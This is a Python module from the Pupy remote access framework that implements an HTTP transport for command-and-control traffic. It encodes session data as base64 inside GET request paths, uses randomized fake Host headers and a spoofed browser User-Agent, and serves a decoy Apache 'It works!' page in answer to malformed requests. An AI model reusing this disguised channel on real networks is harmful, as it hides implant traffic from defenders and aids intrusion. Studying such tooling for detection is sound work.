# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

""" This module contains an implementation of the 'http' transport for pupy. """

from ..base import BasePupyTransport
import base64, random, string, logging
from collections import OrderedDict
import traceback

class InvalidHTTPReq(Exception):
	pass

class MalformedData(Exception):
	pass

def data2http_req(data, headers):
	request="GET /%s HTTP/1.1\r\n"%base64.b64encode(data)
	for name, value in headers.iteritems():
		request+="%s: %s\r\n"%(name, value)
	request+="\r\n"
	return request

def http_req2data(s):
	if not s.startswith("GET "):
		raise InvalidHTTPReq()
	first_line=s.split("\r\n")[0]
	method, path, http_ver=first_line.split()
	try:
		decoded_data=base64.b64decode(path[1:])
	except:
		raise MalformedData("can't decode b64")
	if not decoded_data:
		raise MalformedData("empty data")
	return decoded_data


error_response_body="""<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>"""
error_response="HTTP/1.1 200 OK\r\n"
error_response+="Server: Apache\r\n"
error_response+="Content-Type: text/html; charset=utf-8\r\n"
error_response+="Content-Length: %s\r\n"%len(error_response_body)
error_response+="\r\n"
error_response+=error_response_body

class PupyHTTPTransport(BasePupyTransport):
	"""
	Implements the http protocol transport for pupy.
	"""
	pass

class PupyHTTPClient(PupyHTTPTransport):
	def __init__(self, *args, **kwargs):
		PupyHTTPTransport.__init__(self, *args, **kwargs)
		self.headers=OrderedDict({
			"Host" : "www."+''.join(random.choice(string.ascii_lowercase) for _ in range(0, random.randint(7,10)))+".com",
			"User-Agent" : "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
			"Connection" : "keep-alive",
		})

	def upstream_recv(self, data):
		"""
			raw data to HTTP request
		"""
		try:
			d=data.peek()
			encoded_data=data2http_req(d, self.headers)
			data.drain(len(d))
			self.downstream.write(encoded_data)
		except Exception as e:
			logging.debug(e)

	def downstream_recv(self, data):
		"""
			HTTP response to raw data
		""" 
		d=data.peek()
		decoded_data=b""
		#let's parse HTTP responses :
		if d.startswith("HTTP/1.1 200 OK\r\n") and "\r\n\r\n" in d:
			while len(d)>0:
				try:
					head, rest=d.split("\r\n\r\n", 1)
					fl, headers=head.split("\r\n",1)
					content_length=None
					for name, value in [[i.strip() for i in x.split(":",1)] for x in headers.split("\r\n")]:
						if name=="Content-Length":
							content_length=int(value)
							break
					if content_length is None:
						break
					decoded_data+=base64.b64decode(rest[:content_length])
					length_to_drain=content_length+4+len(headers)+len(fl)+2
					data.drain(length_to_drain)
					d=d[length_to_drain:]
				except Exception as e:
					logging.debug(e)
					break
		if decoded_data:
			self.upstream.write(decoded_data)
			
		

class PupyHTTPServer(PupyHTTPTransport):
	def __init__(self, *args, **kwargs):
		PupyHTTPTransport.__init__(self, *args, **kwargs)

	def upstream_recv(self, data):
		"""
			raw data to HTTP response
		"""
		try:
			d=data.peek()
			encoded_data=base64.b64encode(d)
			response="HTTP/1.1 200 OK\r\n"
			response+="Server: Apache\r\n"
			response+="Content-Type: text/html; charset=utf-8\r\n"
			response+="Content-Length: %s\r\n"%len(encoded_data)
			response+="\r\n"
			response+=encoded_data
			self.downstream.write(response)
			data.drain(len(d))
		except Exception as e:
			logging.debug(e)

	def downstream_recv(self, data):
		"""
			HTTP requests to raw data
		"""
		try:
			d=data.peek()
			decoded_data=b""
			tab=d.split("\r\n\r\n")
			if not d.endswith("\r\n\r\n"):
				tab=tab[:-1] #last part is not complete yet
			for req in tab:
				try:
					if req:
						decoded_data += http_req2data(req)
						data.drain(len(req)+4)
				except MalformedData:
					logging.debug("malformed data drained: %s"%repr(req))
					data.drain(len(req)+4) # drain malformed data
					self.downstream.drain()
					self.downstream.write(error_response)
					return
				except Exception as e:
					break
			self.upstream.write(decoded_data)
		except Exception as e:
			logging.debug(e)

